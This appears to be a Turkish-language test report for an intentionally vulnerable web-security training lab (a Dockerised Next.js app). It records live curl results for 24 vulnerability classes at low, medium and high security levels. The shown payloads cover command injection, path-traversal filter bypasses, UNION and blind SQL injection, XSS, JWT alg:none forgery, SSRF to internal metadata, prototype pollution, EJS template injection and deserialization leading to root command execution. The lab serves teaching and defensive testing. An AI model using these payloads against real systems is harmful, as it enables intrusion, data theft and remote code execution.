# Test Sonuçları — Canlı Exploit Doğrulaması

**Ortam:** `docker compose up --build` ile çalışan GERÇEK stack.
Uygulama = `app` konteyneri (Next.js 14, `node:20-bullseye`, Linux), API rotaları
`lib/vulns.js` mantığını çalıştırır. İç hedefler izole `internal` ağında:
`internal-admin-panel`, `metadata-mock`.

Aşağıdaki çıktıların **tamamı gerçek isteklerden alınmıştır** (curl, `localhost:3000`).
Seviye `x-security-level: low|medium|high` başlığı (veya `security_level` çerezi) ile seçilir.

> Bu doküman elle yazılmış bir tablo değildir; her satır `curl` ile alınan gerçek
> cevaptır. Ayrıca UI'nin backend'e bağlandığı `node test/ui_check.cjs` ile
> uçtan uca doğrulanmıştır (en altta).

---

## Özet

| # | Zafiyet | Endpoint | LOW (sömürülür) | MEDIUM (bypass) | HIGH (güvenli) |
|---|---------|----------|:---:|:---:|:---:|
| 1 | Brute Force / Enum | `POST /api/login` | ✅ | ✅ | ✅ |
| 2 | Command Injection | `POST /api/ping` | ✅ | ✅ | ✅ |
| 3 | CSRF | `POST /api/profile` | ✅ | ✅ | ✅ |
| 4 | Path Traversal / LFI | `GET /api/read` | ✅ | ✅ | ✅ |
| 5 | SQLi (Error + UNION) | `GET /api/product` | ✅ | ✅ | ✅ |
| 6 | SQLi (Boolean-Blind) | `GET /api/check` | ✅ | ✅ | ✅ |
| 7 | Reflected XSS | `GET /api/search` | ✅ | ✅ | ✅ |
| 8 | Insecure JWT | `POST /api/jwt/verify` | ✅ | ✅ | ✅ |
| 9 | CORS Misconfig | `GET /api/me` | ✅ | ✅ | ✅ |
| 10 | Mass Assignment | `PUT /api/user` | ✅ | ✅ | ✅ |
| 11 | IDOR / BOLA | `GET /api/orders/:id` | ✅ | — | ✅ |
| 12 | Bilgi İfşası (2FA) | `POST /api/2fa` | ✅ | ✅ | ✅ |
| 13 | OTP Brute Force | `POST /api/2fa/verify` | ✅ | ✅ | ✅ |
| 14 | Insecure Randomness | `GET /api/token` | ✅ | ✅ | ✅ |
| 15 | SSRF (iç + metadata) | `POST /api/avatar` | ✅ | ✅ | ✅ |
| 16 | Prototype Pollution | `POST /api/settings` | ✅ | ✅ | ✅ |
| 17 | Server-Side PP → gadget | `POST /api/config` | ✅ | ✅ | ✅ |
| 18 | SSTI (EJS) | `POST /api/template` | ✅ | ✅ | ✅ |
| 19 | Insecure Deserialization | `POST /api/cart/import` | ✅ | ✅ | ✅ |
| 20 | Open Redirect | `GET /api/redirect` | ✅ | ✅ | ✅ |
| 21 | Host Header Poisoning | `POST /api/reset` | ✅ | ✅ | ✅ |
| 22 | Race Condition (TOCTOU) | `POST /api/coupon` | ✅ | — | ✅ |
| 23 | Business Logic | `POST /api/checkout` | ✅ | ✅ | ✅ |
| 24 | ReDoS | `POST /api/validate` | ✅ | — | ✅ |

**24 zafiyetin tamamı canlı olarak doğrulandı.** İzole ağdaki flag'ler SSRF/IDOR/LFI
ile gerçekten ele geçirildi.

---

## Seçilmiş Gerçek Çıktılar

### #2 Command Injection — `127.0.0.1; id`
```
LOW    → {"output":"PING 127.0.0.1 ...64 bytes...\nuid=0(root) gid=0(root) groups=0(root)\n"}
MEDIUM → "127.0.0.1 | id"  → uid=0(root)    ( ; ve && silinir, | çalışır )
MEDIUM → "127.0.0.1; id"   → ping not found, id ÇALIŞMAZ (filtrelendi)
HIGH   → {"error":"invalid host"}            (allowlist regex)
```

### #4 Path Traversal / LFI
```
LOW    → ?file=/etc/passwd                          → root:x:0:0:root:/root:/bin/bash ...
MEDIUM → ?file=flag.txt                              → FLAG{lfi_dizin_kacisi_3b9d}
MEDIUM → ?file=....//....//....//....//etc/passwd    → root:x:0:0:...  (../ filtresi atlatıldı)
HIGH   → ?file=/etc/passwd                           → {"error":"denied"}
HIGH   → ?file=notes.txt                             → (safe/ allowlist okunur)
```

### #5 SQL Injection
```
LOW '       → {"sqlError":"... unrecognized token: \"'\""}     (hata ifşası)
LOW UNION   → 0 UNION SELECT id,username,password,role FROM User
            → [{"name":"admin","price":"5f4dcc3b5aa765d61d8327deb882cf99","stock":"admin"}, ...]
              (admin MD5 hash sızdı → rockyou+hashcat ile 'password')
MEDIUM      → SeLeCt ile aynı sonuç (select filtresi atlatıldı)
HIGH        → []  (parametreli; enjeksiyon etkisiz)
```

### #6 Boolean-Blind SQLi
```
LOW  admin' AND '1'='1  → {"ok":true}      (oracle: doğru)
LOW  admin' AND '1'='2  → {"ok":false}     (oracle: yanlış)
HIGH admin' AND '1'='1  → {"ok":false}     (parametreli)
```

### #7 Reflected XSS
```
LOW    → <div id="result"><script>alert(1)</script></div>
MEDIUM → <div id="result"><img src=x onerror=alert(1)></div>   (<script> söküldü, handler kaldı)
HIGH   → <div id="result"><img src="x"></div>                  (DOMPurify)
```

### #8 Insecure JWT
```
LOW    alg:none forge       → {"valid":true,"payload":{...,"role":"admin"},"note":"alg:none kabul edildi!"}
MEDIUM secret123 imzalı     → {"valid":true,...}
HIGH   secret123 imzalı     → {"valid":false,"error":"invalid signature"}
```

### #9 CORS — `Access-Control-Allow-Origin`
```
LOW    Origin: https://evil.com         → ACAO: https://evil.com          (yansıma)
MEDIUM Origin: https://eviltrusted.com  → ACAO: https://eviltrusted.com   (endsWith bypass)
MEDIUM Origin: https://evil.com         → (ACAO yok)
HIGH   Origin: https://evil.com         → (ACAO yok)
```

### #15 SSRF — izole ağdaki iç servisler
```
LOW  http://internal-admin-panel:3000/flag → {"status":200,"body":"FLAG{ssrf_internal_panel_pwned}\n"}
LOW  http://metadata-mock/                 → {"status":200,"body":"FLAG{ssrf_metadata_a17c}\n..."}
MEDIUM http://127.0.0.1:3000/              → {"error":"blocked"}
MEDIUM http://internal-admin-panel:3000/flag → FLAG{...}  (localhost filtresi iç ağı korumaz!)
HIGH http://internal-admin-panel:3000/flag → {"error":"yalnizca dis CDN'e izin var (allowlist)"}
```

### #16 / #17 Prototype Pollution
```
#16 LOW    {"__proto__":{"isAdmin":true}}                      → {"polluted":true,"leakedKeys":["isAdmin"]}
#16 MEDIUM {"__proto__":{"isAdmin":true}}                      → {"polluted":false}         (__proto__ reddedildi)
#16 MEDIUM {"constructor":{"prototype":{"isAdmin":true}}}      → {"polluted":true}          (bypass)
#16 HIGH                                                       → {"polluted":false}
#17 LOW    {"__proto__":{"NODE_OPTIONS":"--require /tmp/x.js"}} → {"pollutedGadget":"--require /tmp/x.js"}
```

### #18 SSTI / #19 Deserialization (RCE)
```
#18 LOW  <%= 7*7 %>                                          → {"out":"49"}
#18 LOW  <%= global.process...require('child_process').execSync('id') %> → {"out":"uid=0(root)..."}
#18 HIGH <%= 7*7 %>                                          → {"out":"Merhaba &lt;%= 7*7 %&gt;"}  (data-binding)
#19 LOW  _$$ND_FUNC$$_ IIFE                                  → {"data":{"rce":"uid=0(root)..."}}
#19 MEDIUM                                                   → marker filtrelendi (fonksiyon string kaldı)
#19 HIGH                                                     → JSON.parse (fonksiyon çalışmaz)
```

### #11 IDOR / #22 Race / #24 ReDoS
```
#11 LOW  GET /api/orders/1 (x-user-id:2)  → {...,"secret":"FLAG{idor_admin_order_7c1a}"}
#11 HIGH GET /api/orders/1 (x-user-id:2)  → 404 {"error":"not found"}
#22 LOW  10 eşzamanlı POST                → tek kullanımlık kupon 9–10/10 uygulandı (TOCTOU)
#22 HIGH 10 eşzamanlı POST                → 1/10 uygulandı (atomik UPDATE)
#24 HIGH a×30+!                           → {"ok":false} [0.28 s]   (lineer)
#24 LOW  a×26+!                           → {"ok":false} [1.97 s]
#24 LOW  a×29+!                           → {"ok":false} [14.8 s]   (katastrofik backtracking)
```

### #13 OTP Brute Force / #1 Brute Force
```
#13 LOW  8 yanlış deneme  → hepsi HTTP 200 (limit YOK)
#13 MED  6. yanlış → 429; yeni kod iste → 200 (sayaç sıfırlandı = bypass)
#13 HIGH 6. yanlış → 429; yeni kod iste → 429 (kilit kalır = güvenli)
#1  MED  aynı XFF'den 6. istek → 429 ; farklı XFF → 401 (limit XFF ile atlatılır)
#1  HIGH aynı kullanıcı 6 yanlış → 429 (hesap kilidi)
```

---

## UI ↔ Backend Sözleşme Testi

`node test/ui_check.cjs` — `app/labData.js`'teki gerçek istek spec'lerini alıp
`app/Demos.jsx`'in `fetch` mantığını canlı uygulamaya karşı çalıştırır:

```
23 geçti, 0 başarısız (24 vuln).   [cors-misconfig: manuel — Origin başlığı tarayıcıdan setlenemez, curl ile]
```

Her demo doğru endpoint'i çağırır, exploit gerçekten gerçekleştiğinde (sunucunun
gerçek cevabındaki imza) flag gösterilir; HIGH seviyede sinyal oluşmaz (güvenli).

## Notlar / Ortam Gerçekleri

- `ping` aracı imaja eklendi (`iputils-ping`) → #2 gerçek ping çıktısı + enjekte komut.
- Tablolar **Linux** runtime'da geçerlidir (`/etc/passwd`, `uid=0`, bash). Windows'ta
  doğrudan `node` ile `cmd.exe` kullanılır; bu yüzden test Docker (Linux) üzerinden yapılır.
- `#22` yarış: tarayıcı/curl çok soketli gerçek eşzamanlılık kullanır; Node `fetch`
  keep-alive ile istekleri seri yapabildiğinden test gerçek soketle (`http.request`) ölçülür.
